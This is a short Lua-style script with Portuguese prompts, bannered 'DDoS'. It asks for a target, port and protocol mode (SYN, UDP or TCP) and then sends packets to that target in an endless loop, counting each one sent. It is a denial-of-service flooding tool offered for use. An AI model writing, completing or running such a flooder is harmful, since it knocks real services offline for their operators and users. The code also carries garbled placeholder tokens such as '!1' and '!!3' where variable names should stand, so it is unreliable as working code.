lg()
ui.color("blue", "bold")
ui.fig("DDoS")
ui.color("reset")

-- Variaveis

VariavelNumeroUmAlvo1 = arg[1]
VariavelNumeroDoisPort2 = arg[2]
TipoDeSocketMode3 = arg[3]
ContagemDeHits4 = 0

if not (!1) then
    print("Variavel Alvo nao passada no Script Via Argumento\n Mode Input:\n")
    !1 = input("Alvo: ")
end
if not (!2) then
    print("Variavel Port nao passada no Script Via Argumento\n Mode Input:\n")
    !2 = tonumber(input("Port: "))
end
if not (!3) then
    print("Variavel Mode Protocol nao passada no Script Via Argumento\n Mode Input:\n")
    !3 = tostring(input("Modes: SYN | UDP | TCP: "))
end

function main()
    while true do
        print(net[!!3](!!1, !!2))
        !!4 = !!4 + 1
        print("Socks Enviandos: "..!!4)
    end
end
main()
